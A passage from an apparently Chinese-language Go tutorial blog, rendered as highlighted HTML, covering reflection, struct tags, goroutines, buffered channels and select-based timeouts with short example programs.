class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`name:"qiyou" Sex:"man"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">zhangsan := person{}</span><br><span class="line">t := reflect.TypeOf(zhangsan)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name, ok := t.FieldByName(<span class="string">"Name"</span>); ok {</span><br><span class="line">fmt.Println(name.Tag.Get(<span class="string">"name"</span>))</span><br><span class="line">fmt.Println(name.Tag.Get(<span class="string">"Sex"</span>))</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line">qiyou</span><br><span class="line">man</span><br></pre></td></tr></tbody></table></figure><p><strong>注意一点就是：key和value之间不能有任何空格，即上面例子中name:”qiyou”之间不能有任何空格，如果有空格则会输出空，不会报错</strong></p><h4 id="通过反射获取值信息"><a href="#通过反射获取值信息" class="headerlink" title="通过反射获取值信息"></a>通过反射获取值信息</h4><p>Go语言中，使用<code>reflect.ValueOf()</code>函数获得值的反射值对象（<code>reflect.Value</code>）。书写格式如下：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value := reflect.ValueOf(rawValue)</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>reflect.ValueOf</code> 返回<code>reflect.Value</code>类型，包含有 <code>rawValue</code>的值信息。<code>reflect.Value</code> 与原值间可以通过值包装和值获取互相转化。reflect.Value 是一些反射操作的重要类型，如反射调用函数。</p><p>从反射值对象<code>（reflect.Value）</code>中获取值的方法<br>可以通过下面几种方法从反射值对象 <code>reflect.Value</code> 中获取原值，如下表所示。</p><p>反射值获取原始值的方法<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Interface() <span class="keyword">interface</span> {}将值以 <span class="keyword">interface</span>{} 类型返回，可以通过类型断言转换为指定类型</span><br><span class="line">Int() <span class="keyword">int64</span>将值以 <span class="keyword">int</span> 类型返回，所有有符号整型均可以此方式返回</span><br><span class="line">Uint() <span class="keyword">uint64</span>将值以 <span class="keyword">uint</span> 类型返回，所有无符号整型均可以此方式返回</span><br><span class="line">Float() <span class="keyword">float64</span>将值以双精度（<span class="keyword">float64</span>）类型返回，所有浮点数（<span class="keyword">float32</span>、<span class="keyword">float64</span>）均可以此方式返回</span><br><span class="line">Bool() <span class="keyword">bool</span>将值以 <span class="keyword">bool</span> 类型返回</span><br><span class="line">Bytes() []bytes将值以字节数组 []bytes 类型返回</span><br><span class="line">String() <span class="keyword">string</span>将值以字符串类型返回</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> i <span class="keyword">int</span>=<span class="number">12</span></span><br><span class="line">t:=reflect.ValueOf(i)</span><br><span class="line">fmt.Println(t.Interface())</span><br><span class="line">fmt.Println(t.Int())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="通过反射访问结构体成员的值"><a href="#通过反射访问结构体成员的值" class="headerlink" title="通过反射访问结构体成员的值"></a>通过反射访问结构体成员的值</h4><blockquote><p>反射值对象（reflect.Value）提供对结构体访问的方法，通过这些方法可以完成对结构体任意值的访问，如下表所示。</p></blockquote><p>反射值对象的成员访问方法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Field(i int) Value根据索引，返回索引对应的结构体成员字段的反射值对象。当值不是结构体或索引超界时发生宕机</span><br><span class="line">NumField() int返回结构体成员字段数量。当值不是结构体或索引超界时发生宕机</span><br><span class="line">FieldByName(name string) Value根据给定字符串返回字符串对应的结构体字段。没有找到时返回零值，当值不是结构体或索引超界时发生宕机</span><br><span class="line">FieldByIndex(index []int) Value多层成员访问时，根据 []int 提供的每个结构体的字段索引，返回字段的值。 没有找到时返回零值，当值不是结构体或索引超界时发生宕机</span><br><span class="line">FieldByNameFunc(match func(string) bool) Value根据匹配函数匹配需要的字段。找到时返回零值，当值不是结构体或索引超界时发生宕机</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> say <span class="keyword">struct</span>{</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line"><span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age  <span class="keyword">uint</span></span><br><span class="line">test <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">method</span> <span class="title">say</span></span></span><br><span class="line"><span class="function">}</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">zhangsan := person{Name: <span class="string">"zhangsan"</span>, method: say{<span class="number">1</span>,<span class="string">"lisi"</span>}}</span><br><span class="line">t := reflect.ValueOf(zhangsan)</span><br><span class="line">fmt.Println(<span class="string">"Len: "</span>, t.NumField())                              <span class="comment">//字段数</span></span><br><span class="line">fmt.Println(<span class="string">"Value: "</span>, t.Field(<span class="number">1</span>), <span class="string">"Type: "</span>, t.Field(<span class="number">1</span>).Type()) <span class="comment">//输出字段的值和类型</span></span><br><span class="line">fmt.Println(t.FieldByName(<span class="string">"Name"</span>))                              <span class="comment">//根据名字查找字段</span></span><br><span class="line">fmt.Println(t.FieldByIndex([]<span class="keyword">int</span>{<span class="number">0</span>}))</span><br><span class="line">fmt.Println(<span class="string">"Value: "</span>,t.FieldByIndex([]<span class="keyword">int</span>{<span class="number">4</span>,<span class="number">1</span>}), <span class="string">"Type: "</span>,t.FieldByIndex([]<span class="keyword">int</span>{<span class="number">4</span>,<span class="number">1</span>}).Type()) <span class="comment">//[]int{4,1}中的四就是索引为4的元素，即method；1为method中索引为1的元素</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="判断反射值的空和有效性"><a href="#判断反射值的空和有效性" class="headerlink" title="判断反射值的空和有效性"></a>判断反射值的空和有效性</h4><blockquote><p>IsNil()和IsValid()</p></blockquote><h4 id="通过反射修改变量的值"><a href="#通过反射修改变量的值" class="headerlink" title="通过反射修改变量的值"></a>通过反射修改变量的值</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用 reflect.Value 取元素、取地址及修改值的属性方法请参考下表。</span><br><span class="line">反射值对象的判定及获取元素的方法</span><br><span class="line">Elem() Value取值指向的元素值，类似于语言层*操作。当值类型不是指针或接口时发生宕 机，空指针时返回 <span class="literal">nil</span> 的 Value</span><br><span class="line">Addr() Value对可寻址的值返回其地址，类似于语言层&amp;操作。当值不可寻址时发生宕机</span><br><span class="line">CanAddr() <span class="keyword">bool</span>表示值是否可寻址</span><br><span class="line">CanSet() <span class="keyword">bool</span>返回值能否被修改。要求值可寻址且是导出的字段</span><br></pre></td></tr></tbody></table></figure><p>我们可以通过调用 <code>reflect.ValueOf(&amp;x).Elem()</code>，来获取任意变量x对应的可取地址的 Value。</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">t:=<span class="number">1</span></span><br><span class="line">fmt.Println(reflect.ValueOf(t).CanAddr()) <span class="comment">//false</span></span><br><span class="line">fmt.Println(reflect.ValueOf(&amp;t).CanAddr()) <span class="comment">//false</span></span><br><span class="line">fmt.Println(reflect.ValueOf(&amp;t).Elem().CanAddr()) <span class="comment">//true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>值修改相关方法<br>使用 <code>reflect.Value</code>修改值的相关方法如下表所示。<br>反射值对象修改值的方法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set(x Value)将值设置为传入的反射值对象的值</span><br><span class="line">Setlnt(x int64)使用 int64 设置值。当值的类型不是 int、int8、int16、 int32、int64 时会发生宕机</span><br><span class="line">SetUint(x uint64)使用 uint64 设置值。当值的类型不是 uint、uint8、uint16、uint32、uint64 时会发生宕机</span><br><span class="line">SetFloat(x float64)使用 float64 设置值。当值的类型不是 float32、float64 时会发生宕机</span><br><span class="line">SetBool(x bool)使用 bool 设置值。当值的类型不是 bod 时会发生宕机</span><br><span class="line">SetBytes(x []byte)设置字节数组 []bytes值。当值的类型不是 []byte 时会发生宕机</span><br><span class="line">SetString(x string)设置字符串值。当值的类型不是 string 时会发生宕机</span><br><span class="line">以上方法，在 reflect.Value 的 CanSet 返回 false 仍然修改值时会发生宕机。</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="通过反射调用函数"><a href="#通过反射调用函数" class="headerlink" title="通过反射调用函数"></a>通过反射调用函数</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> {</span><br><span class="line"><span class="keyword">return</span> a + b</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">funcAdd:=reflect.ValueOf(add)</span><br><span class="line">param:=[]reflect.Value{reflect.ValueOf(<span class="number">1</span>),reflect.ValueOf(<span class="number">2</span>)}</span><br><span class="line">result:=funcAdd.Call(param)</span><br><span class="line">fmt.Println(result[<span class="number">0</span>].Interface())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><ol><li>当main函数返回时，所有的<code>goroutine</code>都会退出，然后程序就退出</li><li><p>main函数是不会等待<code>goroutine</code>执行完的，比如如下代码没有输出A，因为还没有执行到匿名函数的<code>goroutine</code>main函数就已经结束了</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        fmt.Println(<span class="string">"A"</span>)</span><br><span class="line">    }()</span><br><span class="line">    fmt.Println(<span class="string">"B"</span>)</span><br><span class="line">    fmt.Println(<span class="string">"Done"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>不同的<code>goroutine</code>是不会相会影响的，不如如下代码，第一个匿名函数中的sleep是不会影响第二匿名函数的<code>goroutine</code>的</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++{</span><br><span class="line">            fmt.Println(<span class="string">"A"</span>)</span><br><span class="line">            time.Sleep(<span class="number">200</span> *time.Millisecond)</span><br><span class="line">        }</span><br><span class="line">    }()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++{</span><br><span class="line">            fmt.Println(<span class="string">"C"</span>)</span><br><span class="line">        }</span><br><span class="line">    }()</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">"B"</span>)</span><br><span class="line">    time.Sleep(<span class="number">1</span> *time.Second)</span><br><span class="line">    fmt.Println(<span class="string">"Done"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>要注意的一点是，如果主<code>goroutine</code>一直阻塞的话，会报错，但是其它<code>goroutine</code>是没有影响的，比如如下代码，最后是没有输入<code>Die</code>的，说明这个<code>goroutine</code>被一直阻塞着，但是对整个程序来说没有影响，反过来，如果是主<code>goroutine</code>阻塞了，没有接收或者发送给其它<code>goroitine</code>，那么就会报错：<code>fatal error: all goroutines are asleep - deadlock!</code>，主<code>goroutine</code>等一个永远都不会接收或者发送的数据，那么程序就会一直等下去，显然这是不允许的，所以就会报错</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">int</span> = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">for</span> data := <span class="keyword">range</span> ch {</span><br><span class="line">fmt.Println(data)</span><br><span class="line">}</span><br><span class="line">fmt.Println(<span class="string">"Die"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">go</span> test()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++ {</span><br><span class="line">ch &lt;- i</span><br><span class="line">}</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">data := <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="number">10</span> {</span><br><span class="line">fmt.Println(<span class="string">"Done"</span>)</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><p>带缓冲通道的阻塞条件<br>带缓冲通道在很多特性上和无缓冲通道是类似的。无缓冲通道可以看作是长度永远为 0 的带缓冲通道。因此根据这个特性，带缓冲通道在下面列举的情况下依然会发生阻塞：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带缓冲通道被填满时，尝试再次发送数据时发生阻塞。</span><br><span class="line">带缓冲通道为空时，尝试接收数据时发生阻塞。</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    Sendch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">3</span>)</span><br><span class="line">    Sendch &lt;<span class="number">-1</span></span><br><span class="line">    Sendch &lt;<span class="number">-2</span></span><br><span class="line">    Sendch &lt;<span class="number">-3</span></span><br><span class="line">    fmt.Println(<span class="string">"len:"</span>,<span class="built_in">len</span>(Sendch))</span><br><span class="line">    fmt.Println(&lt;-Sendch)</span><br><span class="line">    <span class="comment">//Sendch &lt;-4 这个时候如果再往通道里面放数据，就会阻塞</span></span><br><span class="line">    <span class="keyword">for</span> data:=<span class="keyword">range</span> Sendch{</span><br><span class="line">        fmt.Println(data)</span><br><span class="line">        <span class="keyword">if</span> data==<span class="number">3</span>{</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    fmt.Println(<span class="string">"len:"</span>,<span class="built_in">len</span>(Sendch))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通道的超时机制</p><blockquote><p>配合select机制</p></blockquote><p>如果有一个或多个IO操作可以完成，则Go运行时系统会随机的选择一个执行，否则的话，如果有default分支，则执行default分支语句，如果连default都没有，则select语句会一直阻塞，直到至少有一个IO操作可以进行.</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    ch:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>{})</span><br><span class="line">    timeout:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        time.Sleep(<span class="number">3</span> *time.Second)</span><br><span class="line">        timeout&lt;-<span class="literal">true</span></span><br><span class="line">    }()</span><br><span class="line">    <span class="keyword">select</span>{</span><br><span class="line">        <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">            fmt.Println(<span class="string">"No timeout"</span>)</span><br><span class="line">        <span class="keyword">case</span> &lt;-timeout:</span><br><span class="line">            fmt.Println(<span class="string">"timeout"</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">"default"</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span></span><br><span class="line">因为前面的ch和timeout的通道都没有接收到数据，所以默认会执行<span class="keyword">default</span></span><br></pre></td></tr></tbody></table></figure><p>1). 如果我们把上面的default注释掉的话，会怎么样呢，会输出<code>timeout</code>，因为没有了default语句，如果其它通道一直接收到数据的话就会一直阻塞，直到有其它<code>goroutine</code>给它发送数据，上面的匿名<code>goroutine</code>sleep 3秒之后就会给通道<code>timeout</code>发送数据，所以就会输出<code>timeout</code></p><p>2). 那如果我们把上面代码改为如下代码会输出什么呢<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="comment">// import "time"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    ch:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>{})</span><br><span class="line">    timeout:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        timeout&lt;-<span class="literal">true</span></span><br><span class="line">        ch&lt;<span class="number">-1</span></span><br><span class="line">    }()</span><br><span class="line">    fmt.Println(<span class="string">"main goroutine begin"</span>)</span><br><span class="line">    <span class="keyword">select</span>{</span><br><span class="line">        <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">            fmt.Println(<span class="string">"No timeout"</span>)</span><br><span class="line">        <span class="keyword">case</span> &lt;-timeout:</span><br><span class="line">            fmt.Println(<span class="string">"timeout"</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">"default"</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output</span><br><span class="line">会随机输出timeout、No timeout和<span class="keyword">default</span>，因为所有通道都满足<span class="keyword">case</span>，则<span class="keyword">go</span>运行的时候会随机选择一个<span class="keyword">case</span>执行</span><br></pre></td></tr></tbody></table></figure><p></p><p>简单模拟一下客户端服务端通信<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"errors"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Client</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">interface</span>{}, content <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">interface</span>{}, error)</span></span> {</span><br><span class="line">ch &lt;- content</span><br><span class="line"><span class="keyword">select</span> {</span><br><span class="line"><span class="keyword">case</span> resp := &lt;-ch:</span><br><span class="line"><span class="keyword">return</span> resp, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(<span class="number">2</span> * time.Second):</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, errors.New(<span class="string">"time out"</span>)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Server</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">interface</span>{}, content <span class="keyword">string</span>)</span></span>{</span><br><span class="line">    <span class="keyword">for</span>{</span><br><span class="line">        data:=&lt;-ch</span><br><span class="line">        fmt.Println(<span 